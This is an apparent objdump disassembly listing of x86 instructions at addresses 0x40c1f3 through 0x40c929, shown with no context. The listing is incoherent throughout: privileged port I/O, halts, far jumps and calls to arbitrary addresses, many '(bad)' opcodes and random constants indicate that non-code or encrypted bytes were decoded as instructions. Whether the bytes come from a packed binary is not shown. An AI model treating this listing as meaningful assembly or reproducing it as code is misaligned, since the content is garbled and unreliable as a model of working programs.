  40c1f3:	lods   eax,DWORD PTR ds:[esi]
  40c1f4:	push   ds
  40c1f5:	hlt    
  40c1f6:	adc    eax,0x90c243c5
  40c1fb:	jle    0x40c212
  40c1fd:	pop    es
  40c1fe:	clc    
  40c1ff:	cdq    
  40c200:	fnstcw WORD PTR [ebx]
  40c202:	ret    0x813c
  40c205:	dec    ebx
  40c206:	or     dh,cl
  40c208:	popf   
  40c209:	leave  
  40c20a:	stos   DWORD PTR es:[edi],eax
  40c20b:	or     eax,0x136defa2
  40c210:	lds    esi,FWORD PTR [ebp+0x2b]
  40c213:	inc    esi
  40c214:	sbb    ebp,ecx
  40c216:	or     DWORD PTR [esi+0x357f1cfd],ebx
  40c21c:	fwait
  40c21d:	cs je  0x40c1c3
  40c220:	xlat   BYTE PTR ds:[ebx]
  40c221:	popf   
  40c222:	aad    0x61
  40c224:	mov    eax,ds:0x35f88fd5
  40c229:	cdq    
  40c22a:	pop    esi
  40c22b:	xchg   edx,eax
  40c22c:	loopne 0x40c259
  40c22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c22f:	cli    
  40c230:	xchg   esi,eax
  40c231:	sub    esi,ebp
  40c233:	push   ebp
  40c234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c235:	mov    esi,0xd2578323
  40c23a:	lods   al,BYTE PTR ds:[esi]
  40c23b:	push   cs
  40c23c:	lock jmp 0x78b3c87d
  40c242:	aad    0x6a
  40c244:	jmp    0x40c25e
  40c246:	lea    ebp,[ecx-0x3b]
  40c249:	xor    al,0xc0
  40c24b:	push   ecx
  40c24c:	and    eax,0xdd4c4652
  40c251:	pushf  
  40c252:	sti    
  40c253:	cmp    DWORD PTR [esi],esp
  40c255:	and    ecx,DWORD PTR [ebp-0x7d8fc7ef]
  40c25b:	lds    esp,FWORD PTR [ecx+0x46]
  40c25e:	cmp    al,0x6
  40c260:	retf   0xe9c4
  40c263:	mov    ds:0x1bcd2e9c,al
  40c268:	inc    esi
  40c269:	xor    dh,BYTE PTR [edx]
  40c26b:	pop    eax
  40c26c:	push   es
  40c26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26e:	xor    eax,DWORD PTR [edi-0x7c]
  40c271:	(bad)  
  40c273:	stc    
  40c274:	pushf  
  40c275:	lea    eax,[ebx+ebp*1]
  40c278:	ror    BYTE PTR [esi+ebp*8+0x6415e1dd],0xa6
  40c280:	push   ss
  40c281:	or     al,0x2a
  40c283:	xchg   ebx,eax
  40c284:	mov    ds:0xa7e65284,al
  40c289:	jecxz  0x40c2e0
  40c28b:	or     bh,cl
  40c28d:	push   ecx
  40c28e:	push   es
  40c28f:	pusha  
  40c290:	jmp    0x3ec8:0xb6470d75
  40c297:	sbb    al,0xbb
  40c299:	xor    DWORD PTR [edi-0x2d],eax
  40c29c:	mov    ds:0x42f9a3b,al
  40c2a1:	es pop edi
  40c2a3:	retf   
  40c2a4:	sub    BYTE PTR [edi+0x42],dl
  40c2a7:	xor    cl,al
  40c2a9:	and    ch,dh
  40c2ab:	adc    ah,bl
  40c2ad:	out    0x36,al
  40c2af:	sti    
  40c2b0:	inc    ebx
  40c2b1:	popa   
  40c2b2:	xchg   esi,eax
  40c2b3:	popf   
  40c2b4:	aaa    
  40c2b5:	push   ecx
  40c2b6:	lds    eax,FWORD PTR [ecx]
  40c2b8:	mov    eax,ds:0x5ce9f3f5
  40c2bd:	das    
  40c2be:	fisttp WORD PTR ds:0xf8f50c9d
  40c2c4:	cmp    ecx,DWORD PTR [esi-0x62]
  40c2c7:	fsub   QWORD PTR [eax]
  40c2c9:	dec    ebp
  40c2ca:	jnp    0x40c314
  40c2cc:	bnd ret 
  40c2ce:	out    dx,eax
  40c2cf:	pop    ss
  40c2d0:	fimul  DWORD PTR [eax-0x5f]
  40c2d3:	mov    bl,BYTE PTR [ecx]
  40c2d5:	xor    esp,DWORD PTR [eax+0x7d]
  40c2d8:	jmp    FWORD PTR [esi]
  40c2da:	or     dl,BYTE PTR [ebp+0x446a6986]
  40c2e0:	leave  
  40c2e1:	dec    eax
  40c2e2:	ret    0x8cc4
  40c2e5:	sahf   
  40c2e6:	adc    edx,DWORD PTR [edi]
  40c2e8:	ds nop
  40c2ea:	dec    eax
  40c2eb:	mov    ds:0x251bd3d,al
  40c2f0:	outs   dx,DWORD PTR ds:[esi]
  40c2f1:	mov    ebp,0x8391c5f2
  40c2f6:	jnp    0x40c375
  40c2f8:	adc    eax,0xa349e286
  40c2fd:	pop    esp
  40c2fe:	(bad)  
  40c2ff:	and    BYTE PTR [edi],dh
  40c301:	repnz cld 
  40c303:	and    eax,0xe6a2041f
  40c308:	stc    
  40c309:	and    esp,DWORD PTR [esi]
  40c30b:	stc    
  40c30c:	and    al,0xda
  40c30e:	inc    ebx
  40c30f:	ror    edx,1
  40c311:	add    edx,DWORD PTR [eax+0x479ab583]
  40c317:	add    BYTE PTR [esi],dl
  40c319:	mov    edi,0x453a7291
  40c31e:	mov    ds:0x47a91aad,eax
  40c323:	loopne 0x40c353
  40c325:	sub    edx,ecx
  40c327:	(bad)  
  40c328:	sub    al,0x8c
  40c32a:	lea    ebx,[edx+0x31]
  40c32d:	and    ebx,DWORD PTR [esi]
  40c32f:	sbb    al,0x56
  40c331:	sub    BYTE PTR [edi],bh
  40c333:	fsub   DWORD PTR [ecx+0x35faac4e]
  40c339:	mov    eax,0xa5eb14d0
  40c33e:	test   eax,0xb5539f6f
  40c343:	xor    eax,0x4d5e16f8
  40c348:	push   esp
  40c349:	shl    DWORD PTR [eax+0x5a],cl
  40c34c:	pop    edi
  40c34d:	jo     0x40c3b3
  40c34f:	mov    al,0xf6
  40c351:	call   0x6779c77b
  40c356:	cdq    
  40c357:	mov    cl,BYTE PTR ds:0xe7ccd0c7
  40c35d:	jae    0x40c312
  40c35f:	xor    eax,0xd1ed89a1
  40c364:	lds    esi,FWORD PTR [ebp-0x5af53c45]
  40c36a:	push   esp
  40c36b:	push   ds
  40c36c:	mov    eax,0x1ff3b5c
  40c371:	out    0x8b,al
  40c373:	in     eax,dx
  40c374:	sub    cl,BYTE PTR [ebx]
  40c376:	dec    edx
  40c377:	repnz lahf 
  40c379:	push   edi
  40c37a:	mov    ebp,0x11390c84
  40c37f:	jg     0x40c3b4
  40c381:	cwde   
  40c382:	add    eax,0x68e4505
  40c387:	inc    edx
  40c388:	mov    eax,0xdd37669
  40c38d:	iret   
  40c38e:	rol    edi,0x5
  40c391:	inc    esi
  40c392:	(bad)  
  40c394:	lods   al,BYTE PTR ds:[esi]
  40c395:	and    dh,BYTE PTR es:[edx]
  40c398:	mov    eax,ds:0x3e4c0da4
  40c39d:	push   es
  40c39e:	cmc    
  40c39f:	bound  eax,QWORD PTR [edi+0x75]
  40c3a2:	push   edi
  40c3a3:	leave  
  40c3a4:	stc    
  40c3a5:	call   0x82ea:0x9aca21b8
  40c3ac:	sti    
  40c3ad:	hlt    
  40c3ae:	enter  0x4d1b,0x1e
  40c3b2:	xlat   BYTE PTR ds:[ebx]
  40c3b3:	push   ecx
  40c3b4:	loopne 0x40c421
  40c3b6:	mov    eax,0x6ed8f04a
  40c3bb:	cmp    dh,cl
  40c3bd:	dec    eax
  40c3be:	addr16 and ah,ah
  40c3c1:	inc    esp
  40c3c2:	xor    cl,BYTE PTR [eax-0x3c]
  40c3c5:	ins    DWORD PTR es:[edi],dx
  40c3c6:	ror    esp,cl
  40c3c8:	push   edx
  40c3c9:	cs cli 
  40c3cb:	add    BYTE PTR [edx+0x92333d9],cl
  40c3d1:	sbb    ah,cl
  40c3d3:	iret   
  40c3d4:	fcom   QWORD PTR [edi-0x7b]
  40c3d7:	push   0xd914af4f
  40c3dc:	mov    ecx,0x93c54c57
  40c3e1:	cmp    bl,al
  40c3e3:	mov    ebp,0x5b35d28f
  40c3e8:	fwait
  40c3e9:	xchg   BYTE PTR [eax-0x63],ah
  40c3ec:	cmp    al,0x28
  40c3ee:	sub    al,0xad
  40c3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f1:	lds    edi,FWORD PTR [ebp-0x2bb4a6f1]
  40c3f7:	cs (bad) 
  40c3f9:	cwde   
  40c3fa:	int    0x5f
  40c3fc:	sub    edi,DWORD PTR [ecx]
  40c3fe:	das    
  40c3ff:	push   edx
  40c400:	fdivrp st(2),st
  40c402:	bswap  edx
  40c404:	push   cs
  40c405:	push   esi
  40c406:	pushf  
  40c407:	xor    al,0x11
  40c409:	popa   
  40c40a:	lock and edx,esp
  40c40d:	or     eax,0xe0742bdc
  40c412:	sub    al,BYTE PTR [ebx-0x17317de5]
  40c418:	sbb    DWORD PTR [esi+0x2f299885],0x868c98a1
  40c422:	fbld   TBYTE PTR [ecx-0x54145072]
  40c428:	stc    
  40c429:	inc    edi
  40c42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42b:	pop    ecx
  40c42c:	pop    edi
  40c42d:	das    
  40c42e:	pop    ds
  40c42f:	or     ebx,DWORD PTR [ecx+0x4b9d4614]
  40c435:	pop    es
  40c436:	add    DWORD PTR [ecx-0x15],0xffffff8c
  40c43a:	pop    edi
  40c43b:	jo     0x40c43e
  40c43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c43e:	stc    
  40c43f:	push   ebp
  40c440:	pop    edx
  40c441:	and    BYTE PTR [ecx-0xb3a9dea],ch
  40c447:	repnz push cs
  40c449:	lock add al,0xf8
  40c44c:	or     cl,BYTE PTR [eax+0x75]
  40c44f:	imul   esp,DWORD PTR [esi],0x32
  40c452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c453:	nop
  40c454:	pushf  
  40c455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c456:	inc    ebx
  40c457:	outs   dx,DWORD PTR ds:[esi]
  40c458:	ins    DWORD PTR es:[edi],dx
  40c459:	mov    dl,0xce
  40c45b:	es mov eax,0xefb7e841
  40c461:	popa   
  40c462:	xchg   ah,cl
  40c464:	xchg   ebx,eax
  40c465:	sub    edi,DWORD PTR [ebp+0xdb3bf23]
  40c46b:	jecxz  0x40c3fd
  40c46d:	dec    ebx
  40c46e:	push   ebp
  40c46f:	push   0xf
  40c471:	popf   
  40c472:	jb     0x40c430
  40c474:	and    al,0x8d
  40c476:	mov    dh,0x1e
  40c478:	mov    al,0x1
  40c47a:	outs   dx,DWORD PTR ds:[esi]
  40c47b:	loope  0x40c448
  40c47d:	push   edi
  40c47e:	sti    
  40c47f:	sbb    al,0xb1
  40c481:	fisub  WORD PTR [ebx+0x7d42828]
  40c487:	in     eax,0xa0
  40c489:	ins    BYTE PTR es:[edi],dx
  40c48a:	shr    DWORD PTR [esp+ebx*1],cl
  40c48d:	mov    gs,ebp
  40c48f:	or     ecx,esi
  40c491:	setl   BYTE PTR [edx-0x70e93591]
  40c498:	pop    ds
  40c499:	lods   al,BYTE PTR ds:[esi]
  40c49a:	sbb    al,0x50
  40c49c:	dec    eax
  40c49d:	push   edi
  40c49e:	les    ebp,FWORD PTR [eax]
  40c4a0:	les    edi,FWORD PTR [edx+0x25]
  40c4a3:	ror    BYTE PTR [ebx],1
  40c4a5:	sti    
  40c4a6:	sub    ebp,DWORD PTR ds:0xb0f551a9
  40c4ac:	jbe    0x40c518
  40c4ae:	push   edx
  40c4af:	or     ah,al
  40c4b1:	cmp    ah,BYTE PTR [eax]
  40c4b3:	iret   
  40c4b4:	shr    BYTE PTR [ecx+edx*1-0x55],0x43
  40c4b9:	sbb    esi,DWORD PTR [eax-0x1d]
  40c4bc:	mov    ebx,0xbe053ddf
  40c4c1:	std    
  40c4c2:	out    dx,al
  40c4c3:	in     eax,0x37
  40c4c5:	sbb    eax,esi
  40c4c7:	jno    0x40c49f
  40c4c9:	jl     0x40c470
  40c4cb:	ins    DWORD PTR es:[edi],dx
  40c4cc:	sbb    BYTE PTR [edx-0x594ea253],0x6e
  40c4d3:	fwait
  40c4d4:	adc    al,0x1
  40c4d6:	aaa    
  40c4d7:	inc    edx
  40c4d8:	jae    0x40c4a0
  40c4da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4db:	pop    ebp
  40c4dc:	add    al,0x3f
  40c4de:	inc    eax
  40c4df:	sahf   
  40c4e0:	popf   
  40c4e1:	or     DWORD PTR [edi],esp
  40c4e3:	(bad)  
  40c4e4:	into   
  40c4e5:	test   eax,0x35d28376
  40c4ea:	cld    
  40c4eb:	mov    ecx,0xf9687c6a
  40c4f0:	iret   
  40c4f1:	out    0x96,eax
  40c4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4f4:	mov    dl,BYTE PTR [ecx]
  40c4f6:	stos   BYTE PTR es:[edi],al
  40c4f7:	stos   BYTE PTR es:[edi],al
  40c4f8:	cld    
  40c4f9:	cs jbe 0x40c570
  40c4fc:	loop   0x40c554
  40c4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ff:	cmc    
  40c500:	repnz push fs
  40c503:	jg     0x40c550
  40c505:	add    al,BYTE PTR ss:[edi]
  40c508:	jmp    0x84f0d2bd
  40c50d:	pushw  0x8201
  40c511:	jo     0x40c55d
  40c513:	jmp    0xade0:0x2ec3cfcc
  40c51a:	mov    ebp,0x8e00fdcd
  40c51f:	pusha  
  40c520:	aaa    
  40c521:	cld    
  40c522:	rcr    DWORD PTR [edi+0x45],cl
  40c525:	mov    dh,0x4a
  40c527:	arpl   WORD PTR [ecx],bx
  40c529:	lods   eax,DWORD PTR ds:[esi]
  40c52a:	add    DWORD PTR [edx],ebp
  40c52c:	pop    ebx
  40c52d:	std    
  40c52e:	inc    esi
  40c52f:	add    al,0x65
  40c531:	sbb    DWORD PTR [esi+0x7bb621f3],ebp
  40c537:	int3   
  40c538:	mov    ebp,0xc9048280
  40c53d:	adc    DWORD PTR [ebp+0x32079896],0xffffff87
  40c544:	push   ecx
  40c545:	and    ah,dl
  40c547:	xlat   BYTE PTR ds:[ebx]
  40c548:	mov    esp,0x44bf8c0
  40c54d:	cmp    eax,DWORD PTR [esi]
  40c54f:	sbb    eax,0xa192e4f0
  40c554:	lods   al,BYTE PTR ds:[esi]
  40c555:	inc    ebx
  40c556:	outs   dx,BYTE PTR ds:[esi]
  40c557:	repnz pop esp
  40c559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55a:	mov    ebp,0x9b59eb8a
  40c55f:	jae    0x40c508
  40c561:	out    0xa7,eax
  40c563:	pop    ecx
  40c564:	ds retf 
  40c566:	leave  
  40c567:	mov    ch,0x4f
  40c569:	repz imul edx,DWORD PTR [esi+0x7f],0xffffffb2
  40c56e:	inc    ebx
  40c56f:	push   ebx
  40c570:	mov    cs,WORD PTR [ecx-0x43b5312]
  40c576:	rol    ebp,0x9d
  40c579:	pop    ebx
  40c57a:	xchg   edx,eax
  40c57b:	cmp    ch,BYTE PTR [edx-0x25]
  40c57e:	(bad)  
  40c57f:	std    
  40c580:	push   edx
  40c581:	das    
  40c582:	mov    dh,0xe7
  40c584:	cs in  al,0xe2
  40c587:	add    ebp,ebp
  40c589:	push   esp
  40c58a:	arpl   WORD PTR [edx+0x464c42ac],cx
  40c590:	cmp    al,0x83
  40c592:	sbb    bh,al
  40c594:	lods   eax,DWORD PTR ds:[esi]
  40c595:	(bad)  
  40c597:	aaa    
  40c598:	and    ah,BYTE PTR [esi]
  40c59a:	xor    ebx,DWORD PTR [edi]
  40c59c:	adc    eax,0xd2d452c2
  40c5a1:	push   0x44a026a1
  40c5a6:	or     eax,0x9879ce97
  40c5ab:	aam    0xb4
  40c5ad:	mov    eax,ds:0x6258ac91
  40c5b2:	sti    
  40c5b3:	leave  
  40c5b4:	sub    al,0x46
  40c5b6:	je     0x40c5f4
  40c5b8:	jecxz  0x40c583
  40c5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5bb:	inc    ebp
  40c5bc:	adc    dh,dh
  40c5be:	xchg   edi,eax
  40c5bf:	pop    esp
  40c5c0:	jmp    0x3a23:0xf174b0b4
  40c5c7:	jle    0x40c56b
  40c5c9:	mov    ch,0x70
  40c5cb:	lock ds adc al,0x57
  40c5cf:	cwde   
  40c5d0:	mov    dh,0xf1
  40c5d2:	dec    esi
  40c5d3:	dec    ecx
  40c5d4:	test   eax,0xbfcace5b
  40c5d9:	fistp  QWORD PTR [esi-0x3e]
  40c5dc:	mov    WORD PTR ds:0x6b0d8db1,ds
  40c5e2:	retf   0x9383
  40c5e5:	pop    ds
  40c5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e7:	or     DWORD PTR [ebx],eax
  40c5e9:	add    ecx,0xffffff84
  40c5ec:	bound  ebx,QWORD PTR [edi]
  40c5ee:	sub    eax,0xe845944b
  40c5f3:	daa    
  40c5f4:	jo     0x40c624
  40c5f6:	popa   
  40c5f7:	fist   WORD PTR [edi+edx*2]
  40c5fa:	push   esi
  40c5fb:	ins    BYTE PTR es:[edi],dx
  40c5fc:	dec    ecx
  40c5fd:	div    edi
  40c5ff:	out    dx,eax
  40c600:	retf   0x1484
  40c603:	(bad)  
  40c604:	mov    ebp,0x302f726f
  40c609:	push   ds
  40c60a:	mov    ds:0x827ac13b,eax
  40c60f:	jae    0x40c625
  40c611:	(bad)  
  40c613:	or     al,0xfa
  40c615:	popf   
  40c616:	sub    bl,bh
  40c618:	push   ecx
  40c619:	sub    eax,0x303d749a
  40c61e:	mov    edx,0xcc676889
  40c623:	cmp    DWORD PTR [esi+0x7954b634],esp
  40c629:	mov    ds:0x625b1427,al
  40c62e:	clc    
  40c62f:	xchg   ebp,eax
  40c630:	add    al,0xce
  40c632:	mov    bl,0xf6
  40c634:	mov    BYTE PTR [edx+ebp*8+0x18],cl
  40c638:	push   es
  40c639:	mov    DWORD PTR [edi],0xb26b9666
  40c63f:	xchg   eax,edx
  40c641:	cli    
  40c642:	je     0x40c625
  40c644:	fisttp QWORD PTR [eax]
  40c646:	xor    ecx,DWORD PTR [edi-0x55]
  40c649:	inc    edi
  40c64a:	and    eax,0x760cf8b3
  40c64f:	sbb    ah,BYTE PTR [ecx+0x74932fe5]
  40c655:	mov    ebx,0x83d33bd
  40c65a:	out    0x9,al
  40c65c:	and    eax,0x9bec6fde
  40c661:	jbe    0x40c681
  40c663:	jb     0x40c6c2
  40c665:	dec    eax
  40c666:	mov    eax,ds:0x752b17ec
  40c66b:	lods   eax,DWORD PTR ds:[esi]
  40c66c:	dec    edi
  40c66d:	inc    esi
  40c66e:	add    ebx,ebp
  40c670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c671:	mov    eax,esi
  40c673:	pop    esi
  40c674:	add    al,0x73
  40c676:	fidivr WORD PTR [edi+0x38]
  40c679:	add    ecx,DWORD PTR [ebp+esi*1+0x5]
  40c67d:	pop    es
  40c67e:	test   BYTE PTR [eax],ah
  40c680:	sbb    DWORD PTR [edi-0x7c],ebp
  40c683:	stos   DWORD PTR es:[edi],eax
  40c684:	leave  
  40c685:	mov    WORD PTR [ebx],fs
  40c687:	mov    bh,0x7b
  40c689:	pop    ds
  40c68a:	push   esi
  40c68b:	call   0x58039b3b
  40c690:	cmp    ebp,DWORD PTR [eax+0x77]
  40c693:	cwde   
  40c694:	pop    esp
  40c695:	mov    DWORD PTR [eax+0x23],esi
  40c698:	sbb    DWORD PTR [ebx-0x4b],ebx
  40c69b:	push   0x668f00a
  40c6a0:	js     0x40c6fe
  40c6a2:	sbb    al,0xab
  40c6a4:	cli    
  40c6a5:	cwde   
  40c6a6:	imul   edx,DWORD PTR [eax-0x19],0xffffff94
  40c6aa:	mov    bl,0x96
  40c6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6ad:	imul   ebx,DWORD PTR [esi],0x54
  40c6b0:	or     DWORD PTR [edi-0x2ece4a33],edx
  40c6b6:	scas   al,BYTE PTR es:[edi]
  40c6b7:	sbb    edx,DWORD PTR [ebx+0x2e5e46bc]
  40c6bd:	inc    edi
  40c6be:	and    BYTE PTR [ecx+ecx*8],0x41
  40c6c2:	aaa    
  40c6c3:	jns    0x40c69b
  40c6c5:	pop    ecx
  40c6c6:	outs   dx,BYTE PTR ds:[esi]
  40c6c7:	into   
  40c6c8:	lea    esi,[esi-0x2944808]
  40c6ce:	adc    eax,edi
  40c6d0:	push   eax
  40c6d1:	dec    edx
  40c6d2:	push   edx
  40c6d3:	cmp    BYTE PTR [esp+ebp*8-0x6],bh
  40c6d7:	pop    esp
  40c6d8:	out    dx,eax
  40c6d9:	xor    DWORD PTR [ecx+0x34643db8],esi
  40c6df:	ror    DWORD PTR [edx-0x2198eef1],1
  40c6e5:	pop    ss
  40c6e6:	jmp    ebx
  40c6e8:	sti    
  40c6e9:	push   ecx
  40c6ea:	pop    ebp
  40c6eb:	adc    eax,0x8b1aefb2
  40c6f0:	scas   al,BYTE PTR es:[edi]
  40c6f1:	mov    ah,0xd6
  40c6f3:	stos   DWORD PTR es:[edi],eax
  40c6f4:	mov    bh,0x21
  40c6f6:	gs out 0xc0,eax
  40c6f9:	mov    bl,0x13
  40c6fb:	ja     0x40c694
  40c6fd:	shr    esp,0x44
  40c700:	js     0x40c69b
  40c702:	dec    ebp
  40c703:	xchg   ecx,eax
  40c704:	jecxz  0x40c6c6
  40c706:	cmp    bl,dh
  40c708:	retf   
  40c709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70a:	out    dx,eax
  40c70b:	jmp    0x9d69f8c6
  40c710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c711:	imul   eax,DWORD PTR [ecx+0x54],0xe6eafb36
  40c718:	call   0xe8d59e2d
  40c71d:	loopne 0x40c760
  40c71f:	(bad)  
  40c720:	jp     0x40c6af
  40c722:	shl    dl,1
  40c724:	dec    esp
  40c725:	mov    eax,ds:0xa47ae93d
  40c72a:	loop   0x40c735
  40c72c:	and    DWORD PTR [ebp+0x24],edx
  40c72f:	fsubr  DWORD PTR [ecx]
  40c731:	mov    eax,0x9c195d5b
  40c736:	and    al,0x5f
  40c738:	sub    BYTE PTR [ecx-0x11],ch
  40c73b:	cmc    
  40c73c:	xchg   BYTE PTR [ecx],ah
  40c73e:	out    dx,al
  40c73f:	mov    dh,0xf7
  40c741:	(bad)  
  40c743:	or     BYTE PTR [ecx-0x29],0xc3
  40c747:	mov    ecx,0xe1e10e7d
  40c74c:	xchg   ecx,eax
  40c74d:	fdivr  QWORD PTR [ebp+0x3b]
  40c750:	mov    al,ds:0xb178a093
  40c755:	xchg   edi,eax
  40c756:	(bad)  
  40c757:	sbb    esi,ecx
  40c759:	xor    eax,0x6f235b68
  40c75e:	scas   eax,DWORD PTR es:[edi]
  40c75f:	lock fdivr st,st(2)
  40c762:	ror    edi,cl
  40c764:	ror    eax,cl
  40c766:	adc    esp,DWORD PTR [ebx]
  40c768:	xor    ecx,DWORD PTR [esi]
  40c76a:	adc    al,al
  40c76c:	mov    al,ds:0xb1214f88
  40c771:	(bad)  
  40c772:	sub    eax,0xdb6daf2c
  40c777:	lods   al,BYTE PTR ds:[esi]
  40c778:	push   eax
  40c779:	mov    eax,0xbf5ff34e
  40c77e:	pop    edx
  40c77f:	icebp  
  40c780:	push   0xffffffe3
  40c782:	test   eax,0xebc7d236
  40c787:	push   ebp
  40c788:	out    0x20,al
  40c78a:	mov    esp,0x339d84a
  40c78f:	in     eax,dx
  40c790:	jns    0x40c727
  40c792:	jo     0x40c80d
  40c794:	aad    0xee
  40c796:	out    0x83,al
  40c798:	sub    eax,0x377bb8f5
  40c79d:	cld    
  40c79e:	mov    esi,0xe19efe3f
  40c7a3:	pop    ds
  40c7a4:	cmp    ch,bh
  40c7a6:	xor    edx,DWORD PTR [edx]
  40c7a8:	shl    al,1
  40c7aa:	retf   0xf1ba
  40c7ad:	xchg   BYTE PTR ds:0x39cc5d57,cl
  40c7b3:	sti    
  40c7b4:	sub    edx,DWORD PTR [edx+ebp*4+0x42]
  40c7b8:	jl     0x40c7d6
  40c7ba:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c7bc:	xchg   ebx,eax
  40c7bd:	xchg   DWORD PTR [edi],ecx
  40c7bf:	pop    ds
  40c7c0:	cmp    al,0xa3
  40c7c2:	je     0x40c780
  40c7c4:	fwait
  40c7c5:	icebp  
  40c7c6:	or     al,0x15
  40c7c8:	mov    dh,0xe6
  40c7ca:	add    bl,BYTE PTR [edx]
  40c7cc:	sbb    DWORD PTR [ecx+0x2dafa8b],eax
  40c7d2:	js     0x40c764
  40c7d4:	je     0x40c777
  40c7d6:	in     eax,dx
  40c7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d8:	rcl    BYTE PTR [eax+esi*1-0x26],1
  40c7dc:	mov    fs,WORD PTR [ecx+edx*2-0x80]
  40c7e0:	cmp    dh,al
  40c7e2:	fisubr WORD PTR [esi]
  40c7e4:	icebp  
  40c7e5:	pop    ss
  40c7e6:	pop    es
  40c7e7:	sbb    ch,0xff
  40c7ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7eb:	mov    eax,ds:0xe5766c83
  40c7f0:	cmp    BYTE PTR [esi],ch
  40c7f2:	les    esp,FWORD PTR [eax]
  40c7f4:	sub    BYTE PTR [edx-0x5b26e1d2],ah
  40c7fa:	mov    ds:0xc868df19,al
  40c7ff:	outs   dx,BYTE PTR ds:[esi]
  40c800:	xor    DWORD PTR [ebp-0x2a],esi
  40c803:	int3   
  40c804:	ins    DWORD PTR es:[edi],dx
  40c805:	xor    ah,bh
  40c807:	(bad)  
  40c808:	adc    al,0x8e
  40c80a:	sti    
  40c80b:	jg     0x40c805
  40c80d:	jl     0x40c79c
  40c80f:	mov    esi,0xdb6a0335
  40c814:	add    BYTE PTR [ebp+0x6e00a443],bl
  40c81a:	lea    ecx,[ecx+0x67]
  40c81d:	lea    ebx,[esi]
  40c81f:	in     al,dx
  40c820:	push   eax
  40c821:	sbb    BYTE PTR [ecx+ebp*2],0xa5
  40c825:	mov    bl,0x77
  40c827:	sbb    eax,0x14022080
  40c82c:	cmp    bl,bl
  40c82e:	jle    0x40c81c
  40c830:	rcl    BYTE PTR [ecx-0x37e35243],0xc5
  40c837:	add    DWORD PTR [ebx-0x58],eax
  40c83a:	rcr    DWORD PTR [ecx],0xa0
  40c83d:	sub    BYTE PTR [eax+0x3dc6e122],ch
  40c843:	enter  0xcf3c,0xf0
  40c847:	and    eax,DWORD PTR [esi-0x1a]
  40c84a:	daa    
  40c84b:	dec    ecx
  40c84c:	ss das 
  40c84e:	xchg   DWORD PTR [ebp-0x3592da32],ecx
  40c854:	dec    edi
  40c855:	pop    ds
  40c856:	inc    esp
  40c857:	inc    ebx
  40c858:	ret    0xbe67
  40c85b:	and    eax,0x28a84ebc
  40c860:	sbb    cl,bh
  40c862:	out    dx,al
  40c863:	cmp    BYTE PTR [esi-0x23271014],bl
  40c869:	or     DWORD PTR [esi-0x6c8abcf],ecx
  40c86f:	jbe    0x40c8d2
  40c871:	or     BYTE PTR [ebx+0x13c2cc83],ch
  40c877:	loopne 0x40c864
  40c879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c87a:	das    
  40c87b:	push   es
  40c87c:	jg     0x40c89d
  40c87e:	mov    ch,0xdf
  40c880:	inc    DWORD PTR es:[ecx+0x71a9e520]
  40c887:	pop    edi
  40c888:	pop    cx
  40c88a:	cwde   
  40c88b:	fwait
  40c88c:	test   al,0x75
  40c88e:	sbb    BYTE PTR [esi-0x7b34cd25],ah
  40c894:	aad    0x8e
  40c896:	mov    edx,0xc0118eda
  40c89b:	or     DWORD PTR ds:0xda300eef,ebx
  40c8a1:	pop    ds
  40c8a2:	add    ebx,edx
  40c8a4:	inc    ebp
  40c8a5:	into   
  40c8a6:	inc    edi
  40c8a7:	add    al,0xaa
  40c8a9:	sbb    eax,0xd053be80
  40c8ae:	push   cs
  40c8af:	jge    0x4dfdf409
  40c8b5:	adc    ecx,edi
  40c8b7:	dec    esp
  40c8b8:	addr16 mov al,0xe3
  40c8bb:	ins    DWORD PTR es:[edi],dx
  40c8bc:	cld    
  40c8bd:	test   BYTE PTR ds:0xfd2d396b,bh
  40c8c3:	mov    ah,0x12
  40c8c5:	js     0x40c8b4
  40c8c7:	pop    ds
  40c8c8:	jmp    0x6772800
  40c8cd:	jae    0x40c93a
  40c8cf:	sub    DWORD PTR [edx],eax
  40c8d1:	inc    esi
  40c8d2:	ja     0x40c944
  40c8d4:	lea    esp,[edi+0x71]
  40c8d7:	jecxz  0x40c933
  40c8d9:	cdq    
  40c8da:	repnz fsubr QWORD PTR ds:0xe040836a
  40c8e1:	add    al,0x6b
  40c8e3:	add    eax,DWORD PTR [edi+ebp*4+0x6d]
  40c8e7:	xchg   DWORD PTR [edx-0x7c623371],esi
  40c8ed:	call   0xe75b:0xe854359f
  40c8f4:	imul   ecx,esi,0xe27eea95
  40c8fa:	pop    es
  40c8fb:	ret    0x5e7d
  40c8fe:	jecxz  0x40c90d
  40c900:	xchg   BYTE PTR [esi+0x7c],bh
  40c903:	mov    ah,0x71
  40c905:	enter  0x4999,0x4b
  40c909:	sub    DWORD PTR [ebx+ebp*8+0x29],ebp
  40c90d:	jmp    0x7b02cd7d
  40c912:	mov    al,ds:0x3a502bbb
  40c917:	in     al,dx
  40c918:	jl     0x40c94b
  40c91a:	fidivr DWORD PTR ds:0x225e9a61
  40c920:	push   cs
  40c921:	mov    ah,0xaa
  40c923:	sub    al,0x4c
  40c925:	(bad)  
  40c926:	ins    DWORD PTR es:[edi],dx
  40c927:	inc    bh
  40c929:	sbb    eax,0x39fc7558
